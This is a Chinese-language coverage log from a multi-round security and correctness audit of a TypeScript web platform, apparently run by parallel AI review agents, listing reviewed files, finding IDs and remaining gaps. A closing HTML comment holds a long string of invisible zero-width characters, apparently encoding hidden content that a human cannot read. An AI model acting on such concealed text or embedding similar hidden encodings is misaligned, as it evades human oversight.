- E 路 提现状态机：`routes/user/withdrawal-routes.ts`（全）、`payment-extended.ts`（60-260）、`finance-extended.ts`（190-410、480-640）、`admin-shop-routes.ts`（40-120、380-526）、`admin-extended/order-routes.ts`（30-95）、`admin-extended/index.ts`（全）、`admin-invoices.ts`（全）、`refund-audit.ts`（全）、`user/payment-routes.ts`（110-210）、`db/commission-queries.ts`（360-740）、`db/order-queries.ts`（385-575）、`db/agents-queries.ts`（290-360）、`db/export-tasks-queries.ts`（全），并对 `src/db/*.ts` 做 `sum(...)::int` / `.limit(pageSize)` / `.filter|.slice` 三组 grep。
- 本轮主代理复核：F-450（`payment-recurring.ts:645-706`）、F-452（`finance-extended.ts:231-285,342-400`）、F-453（`admin-extended/order-routes.ts:76-93`）。
- 本轮纠错：F-443 修正了 F-385 中「计费统一取映射后模型」的证据表述——实际是流式/缓存取映射、非流式取原始。

### 第十六轮覆盖（五路并行）
- A 路 plugins/config/workers/utils：`plugins/{api-versioning,log-sanitizer,anomaly-detector-plugin,resilience-extended,resilience-toolkit,registry-queue,api-logger,api-logger-extended,trace,compression,search-aspect,swagger-theme,audit,ws-auto-recovery,otel,response-sanitizer,metrics,redis}.ts`；`config/{index,open-capability-registry,body-limits}.ts`；`workers/{index,relay-account-pool-worker}.ts`；`utils/{static-hardening,redact-credential-text,api-schemas,idor-guard,utf8-bound,http-normalize,money}.ts`。
- B 路 db 兜底：`db/*.ts` 100 个生产文件全量 6 组 Grep；逐行补读 `chat-skills-queries.ts`、`chat-sync-rev-queries.ts`、`chat-group-queries.ts`、`chat-conversation-access.ts`、`db/index.ts:19-132`。**零新增**。
- C 路 路由最后矩阵：`routes/admin-extended/{order,user,role}-routes.ts`、`_shared.ts`、`index.ts`；`routes/ws/live-chat.ts`（`ws/` 仅此 1 文件）；`websocket/chat-server.ts`；`plugins/ws-helpers.ts`、`require-permission.ts`、`auth.ts`（110-130/258-303/403-430）；`db/rbac-queries.ts`（300-334）、`db/queries.ts`（127-134）、`db/payment-queries.ts`（40-98）、`db/order-queries.ts`（85-130）；`schema/order.ts`、`billing.ts`（60-125）、`commission.ts`（54-60）；`drizzle/0213_phase5_backfill_orders_sync.sql`；`routes/mobile-chat-routes.ts`（700-810）；抽查 `admin-private-letters.ts`、`admin-sensitive-words.ts`。
- D 路 schema 列宽：`schema/**` 241 个 ts、624 张表做 5 条正则全扫；逐列精读 33 个文件（api-key-shares、device-tokens、upload-sessions、workspace-ai-tasks、oauth、oauth-private-keys、developer-api-keys、user-passkeys、key-rate-window-counts、tool-invocation-ledger、webhook-subscriptions、webhooks、mcp-servers、sdks、billing、api-key-groups、admin-console、teams、play-testers、service-inquiries、ai-config、ai-gc、resource、commission、users、agent-commerce、learn、study、comments、zhs-full、admin-extended、system、coupons、user-preferences）。
- E 路 横切模式：`await fetch(` 163 处/85 文件；`axios/undici` 封装层；模块级 Map/Set 174 行；`setInterval/setTimeout` 10 处；N+1 模式 25 行；catch→`[]/null/true` 80 行。
- 本轮主代理复核：F-460、F-461、F-465、F-475。

### 第十七轮覆盖（五路并行）
- A 路 零散路由组1：`routes/interactions.ts`、`carousel.ts`、`app-version.ts`、`admin-faq.ts`、`admin-agreements.ts`（部分）、`admin-maintenance-notice.ts`、`admin-plugin-stats.ts`；`db/agreements-queries.ts`；对照 `routes/comments.ts`、`admin/content/crud.ts`。
- B 路 零散路由组2：`routes/{leaderboard,goods,groups,dict,announcements,articles}.ts`；辅助 `db/content-queries.ts`、`db/news-queries.ts`、`services/leaderboard-service.ts`、`routes/admin/member-users.ts`、`routes/admin-sys/user-routes.ts`、`schema/{groups,users,model-leaderboard,zhs-full}.ts`、`plugins/{public-paths,auth-default-deny,require-permission}.ts`、`utils/public-edge-cache.ts`。`admin-users.ts` 不存在（Glob 已确认），以 `admin/member-users.ts` 替代。
- C 路 workers：`workers/image-task-worker.ts`、`batch-worker.ts`、`relay-account-pool-worker.ts`、`registry-sync-worker.ts`、`ai-callback-worker.ts`。
- D 路 server 生命周期：`server.ts` 全量（1-963，重点 98-176/144-310/294-460/452-570/586-746）、`routes/index.ts` 全量（重点 583-1535 的 230+ 注册项）、`index.ts` 1-540、`static-hardening.ts`、`plugins/ai-cost.ts`、`token-balance-service.ts`、`fastify/lib/{route,content-type-parser}.js`、`@fastify/multipart/index.js`，及 admin-extended/edu-extended/education-platform/notifications/public-socket/dict/coze-variables/relay-enterprise/team-memory/knowledge-team 路由。
- E 路 learn/live/ai-ext/clawdbot：`routes/learn.ts`、`live.ts`、`ai-extended.ts`、`mobile-chat-routes.ts` 全文；`services/clawdbot/{index,tool-executor,session-manager,gateway,message-processor,models,tools,clawdbot-service}.ts`；定向 `routes/{clawdbot,tools,agent-runtime,auth}.ts`、`db/{live-queries,learn-queries,learn-record-queries,learn-extended-queries,agent-chat-queries,community-queries}.ts`、`schema/{system,community,learn-record}.ts`、`plugins/require-permission.ts`、`utils/sms-send-captcha.ts`、`routes/index.ts`。
- 本轮主代理复核：F-479（interactions 无 sanitizeUgcInput）、F-490（member-users `.returning()`）、F-492/F-493（image-task-worker `running`/无超时）、F-499（server.ts 无 import）、F-500（ai-ext url 全等比较）。
- 本轮负结论：`server.ts` 钩子时序（preReady 快照）非缺陷；JSON parser `parseAs:'string'` 非法 JSON 已兜 400；`admin` 前缀插件抽查未发现守卫遗漏；`educationPlatformRoutes` 双注册前缀不同，非重复路由；goods/dict/leaderboard 零新增。

### 第十八轮覆盖（四路并行）
- A 路 workers 剩余：`workers/email-worker.ts`、`notification-worker.ts`、`notification-dispatch-worker.ts`、`relay-health-check-worker.ts`、`usdt-payment-worker.ts`、`scheduler-worker.ts`（1-1112 全量，含 switch 全部分支）、`workers/index.ts`；取证读 `plugins/queue.ts`、`plugins/scheduler.ts`（33 项 SCHEDULED_JOBS）、`services/{payment-usdt-service,relay-health-check-service,expiration-monitor-service,email-service,ai-feed-service,reconciliation-service}.ts`、`db/notification-queries.ts`、`routes/notifications.ts:400-466`、`index.ts:373-458,519-525`，并核对 bullmq 源码。
- B 路 双入口一致性：`legacy-{ask,exam,live,oss,community,learn,study,batch,work-wechat,langchain}.ts` 十个插件逐对比较；`mobile-chat-routes.ts` ↔ `community/{posts,circles,topics,asks}.ts`；`v1-public.ts` ↔ `v1-{ai-core,messages,responses,batches,assistants,multimodal,gemini,midjourney,rerank-moderations,realtime}` 守卫矩阵。
- C 路 注册矩阵反查：用 TypeScript Compiler API 静态展开 `registerRoutes()` 全树（跨文件 import/barrel 再导出/嵌套 register/内联插件），得到 **4,737 条路由声明 / 4,677 个唯一 `method+path` / 重复键 0**；覆盖 480 静态文件 + 51 个 `await import()` + server.ts 侧 4 处；重点比对 notification×notificationExtended（22）、remoteDevice×remoteExtended（25）、admin×adminExtended×adminSys（62）、educationPlatform 双前缀（12）。
- D 路 定时器配对：全量 Grep `setInterval`（43 个生产文件）、`cron.schedule|upsertJobScheduler|repeat`（15 文件）、`export function start*`、`addHook('onClose')`、`\.unref\(\)`、`stop*/clearInterval`；逐行读 `index.ts:255-430`、`worker-entry.ts:1-102`、`server.ts:440-490`、`plugins/{queue,scheduler,registry-queue,cache-resilience,api-logger,ws-ai,ws-payment,ws-broadcast}.ts`、`db/index.ts:200-300`、`services/{auto-rollback,algorithm-record-service,edge-access,cache-warmup-service,ip-reputation,captcha-service,anomaly-detector,terminal-service,upload-merge-gate}.ts`；建立 38 行「启动点→关停点→是否被调用」核对表。
- 本轮主代理复核：F-508（6 处 fetch 无 AbortSignal）、F-510（ai-feed catch→success）、F-514（legacy-langchain 无扣费）、F-515（legacy-learn IDOR）、F-518~F-520（三个死文件 Grep）、F-521/F-522（stop 函数零调用）。
- 本轮强负结论：注册矩阵 **零重复路由、零守卫不一致**；4,677 个唯一路径全部可解析，无「注册了但文件不存在」。

### 第十九轮覆盖（五路并行）
- A 路 知识/RAG：`services/knowledge-rag-service.ts`（1-320 全量）、`services/knowledge-chat-context.ts`、`services/knowledge-team-service.ts`、`services/embedding-provider.ts`、`services/repo-wiki-service.ts`、`services/repo-wiki-context.ts`、`services/document-parser.ts`、`routes/knowledge-rag.ts`、`db/knowledge-queries.ts`、`db/team-queries.ts`。
- B 路 存储/文档转换：`services/storage-service.ts`（全文）、`services/workbook-service.ts`、`services/pdf-service.ts`、`services/markdown-converter-service.ts`、`services/excel-export-service.ts`、`services/transcode-service.ts`、`services/oss-sts-service.ts`、`services/tencent-live-service.ts`、`services/relay-conversation-service.ts`、`routes/workbook.ts`、`routes/files.ts`、`routes/other/pdf-routes.ts`。
- C 路 运维/调度/清理：`services/cleanup-service.ts`（全量）、`services/scheduled-tasks-service.ts`、`services/reconciliation-service.ts`、`services/data-archive-service.ts`、`services/backup-jobs-service.ts`、`services/cache-warmup-service.ts`、`services/expiration-monitor-service.ts`、`services/relay-health-check-service.ts`、`services/account-lockout-service.ts`、`services/self-healing.ts`、`jobs/*`（全量 9 个）、`plugins/scheduler.ts`（33 项 SCHEDULED_JOBS 与执行体对照）。
- D 路 db 逐行（资源域）：`db/resource-queries.ts`（1-220 全量逐行）、`db/file-queries.ts`、`db/oss-queries.ts`、`db/payment-queries.ts`、`db/order-queries.ts`、`db/export-tasks-queries.ts`；联动 `routes/resource.ts`（1-400 全量）、`routes/downloads.ts`、`routes/other/oss-resource-routes.ts`、`schema/resource.ts`、`schema/order.ts`。
- E 路 金额/时区专项：`services/relay-billing-service.ts`（成本累计段 340-420）、`routes/admin/relay-logs.ts`（440-480）、`services/developer-relay*.ts`、`services/payment-recurring.ts`（80-110）、`services/payment-usdt-service.ts`、`routes/payment-gateway.ts`（金额累加段）、`services/settlement-service.ts`、`services/commission-settle-service.ts`、`utils/money.ts`、`utils/biz-day.ts`、`utils/timezone-utils.ts`、`utils/calendar-boundary.ts`、`services/edu-ledger.ts`、`db/visit-tracking-queries.ts`。
- 本轮主代理复核：F-525（`knowledge-rag-service.ts:264-278` 去重四条件）、F-526（`:61-70` embed 空 catch）、F-535（ExcelJS 共享公式 model）、F-549（`cleanup-service.ts:32,60-86,131-137` + `routes/files.ts:179`）、F-568（`resource-queries.ts:127-174` 全列 + `resource.ts:47-55`）、F-573（`developer-relay.ts:372,393` + `relay-logs.ts:464`）、F-577（`payment-recurring.ts:87-92`）。
- 本轮两个 P1 均逐行落实：F-549 默认配置（`UPLOAD_DIR` 未设 → `uploads/public`）下上传件满 24h 即被清理器删除；F-568 付费资源 `fileUrl` 随列表/详情整行下发，`checkDownloadPermission` 仅在下载端点生效。
- 本轮负结论：`embedding-provider.ts` 的重试/降级链无放大；`scheduled-tasks-service` 33 项均有 `try/catch` 且单次执行；`jobs/*` 9 个文件全部走 `scheduler` 注册而非模块级 `setInterval`。

### 本轮未覆盖（需后续轮次）
- `routes/**`：第十七轮已覆盖全部 18 个根目录零散路由；第十八轮用编译器 API 覆盖全部 4,737 条路由声明与三个死文件。**路由面已无未扫文件**，仅剩「模板字符串拼接路径」与「`if (env)` 条件注册」两类静态分析盲区（见第十八轮未判定 2）。
- `workers/**`：第十八轮已扫完全部 worker 文件（email/notification*/relay-health-check/usdt-payment/scheduler-worker 1-1112），**workers 面已无未扫文件**。
- `server.ts`：已完成全量生命周期阅读（第十七轮）；第十八轮补充 `buildServer()` 后段的启动点与 onClose 配对。
- `services/**`：第十九轮补读 26 个、第二十轮补读约 33 个、第二十一轮补读 28 个、第二十二轮补读 24 个（含 `push-provider`/`transcode`/`srs-review`/`upload-merge-gate`/`redemption` 等）；累计已精读约 137 个，剩余约 113 个仍为「按调用点定向读」或未读。
- `db/**`：第六轮 6 组全量 Grep + 第十六轮 4 文件逐行 + 第十九轮资源域 6 文件逐行 + 第二十轮 20 个零命中文件全文 + 第二十一轮 37 个文件逐行 + 第二十二轮 21 个文件逐行（`user-queries`/`plugin-events`/`content`/`behavior`/`topic`/`exam`/`community`/`ai-feed-post`/`voice-note`/`private-letters-admin`/`sensitive-words`/`captcha`/`id-mapping`/`mobile-stats`/`resource-likes`/`developer`/`admin`/`knowledge`/`live`/`member` 及 `comment`）；**db 面已无未逐行文件**。
- `utils/**`：第二十二轮 19 个文件全读；**utils 面已无未扫文件**（仅剩零调用方模块的行为推演）。
- `packages/database/src/schema/**`：624 张表 5 条正则全扫 + 33 文件逐列精读 + 第二十一轮类型契约对照（int8/numeric/bigint/timestamp），其余为模式覆盖。
- 原因：轮次与上下文预算限制；未出现在缺陷清单不代表已证明无缺陷。

### 还能继续挖的方向
- **尚未归零**：第二十二轮仍新增 49 条，说明尚未达到「整轮零新增」。最富产的三个组合仍有效：①「两段式预扣 vs 非两段式 `recordCall`」的计费对称性（本轮 F-718、F-722~F-728 全部出自该对照）；②「`sql<number>` 假类型 + `::int` 强转 + 前端直接消费」（本轮 F-698~F-706）；③「状态机枚举与写入分支交叉核对」（本轮 F-693）。
- **`services/**` 剩余约 113 个**：优先本轮只做定向读的 `settlement-service`（月切分区间）、`api-subscription-service`（窗口配额）、`user-billing-group-service`、`knowledge-rag-service`、`storage-service` 分片会话、`relay-conversation-service`，以及从未精读的 `sms-tencent`、`broadcast-email-service`、`relay-session-sync-*`、`relay-account-pool-checkin-sync`、`push-provider` 余段。
- **`packages/database` 迁移与索引面**：F-680/F-689 均因「schema 与 SQL 缺唯一索引」导致幂等失效；建议对 `order_id`/`device_token`/`new_id`/`external_id` 类列做一次「代码里 `ON CONFLICT` / `WHERE 期望唯一`」的反向索引核对。
- **relay 对拍续**：缓存命中路径与订阅/Key 窗口的交互（F-725 已命中一处）、BYOK 的 token 配额口径（未判定 2）、`per_call` 回退 token 计费（未判定 1）、`v1-gemini`/`v1-realtime` 是否复用同一计费层（本轮未扫）。
- **金额与时间**：`real/float8` 浮点累积、`AT TIME ZONE` 与 `+ interval '8 hours'` 叠加点（F-630）、`setDate` 月末溢出、以及剩余管理页 `SUM/AVG` 的 `sql<number>` 假类型（未判定 13 列出的 `developer-relay.ts:221` 等）。
- **模式化复扫**：已验证可批量的模式——「同资源跨方法守卫」「schema 列宽 vs zod 宽松」「事务嵌套」「横切超时/无界 Map/N+1」「双入口一致性」「启动↔关停配对」「死文件未注册」「服务层无调用点」「全列 select + 宽松 schema」「迁移只改一半」「`sql<number>` 假类型 vs 驱动 string」「条件 UPDATE 的 ELSE 保持原值 ⇒ 免费敞口」。
<!-- ⁠​‌​​‌​​‌‍‍​‌​​‌​​​‍‍​‌​‌​‌​‌‍‍​‌​​‌​​‌‍‍​​‌​‌‌​‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌​​‌‌‌‌​‌​‍‍‌‌​‌‌​​​‌​​​‌‌‌‍‍​‌​​​​​‌‍‍​‌​​‌​​‌‍‍‌​‌‌​‌‌‌‍‍‌‌​​‌‌‌​‌​​‌‌‌​‍‍‌‌​​‌‌​​​‌​​‌​‌‍‍‌​‌‌‌​‌‌‌​‌‌‌​‌‍‍‌​‌‌​‌‌‌‍‍​‌​​‌‌​​‍‍​‌​​​​‌‌‍‍‌​‌‌​‌‌‌‍‍​‌‌​​​​‌‍‍​‌‌​‌​​‌‍‍​‌‌‌‌​‌​‍‍​‌‌​‌​​​‍‍​‌‌‌​​‌‌‍‍​​‌​‌‌‌​‍‍​‌‌‌​‌​​‍‍​‌‌​‌‌‌‌‍‍​‌‌‌​​​​‍‍‌​‌‌​‌‌‌‍‍​‌​‌​​​​‍‍​‌​‌​​‌​‍‍​‌​​‌‌‌‌‍‍​‌​‌​‌‌​‍‍​‌​​​‌​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​​‌‍‍​‌​​‌‌‌​‍‍​‌​​​​‌‌‍‍​‌​​​‌​‌‍‍​​‌​‌‌​‌‍‍​​‌‌​​‌​‍‍​​‌‌​​​​‍‍​​‌‌​​‌​‍‍​​‌‌​‌‌​⁠ -->
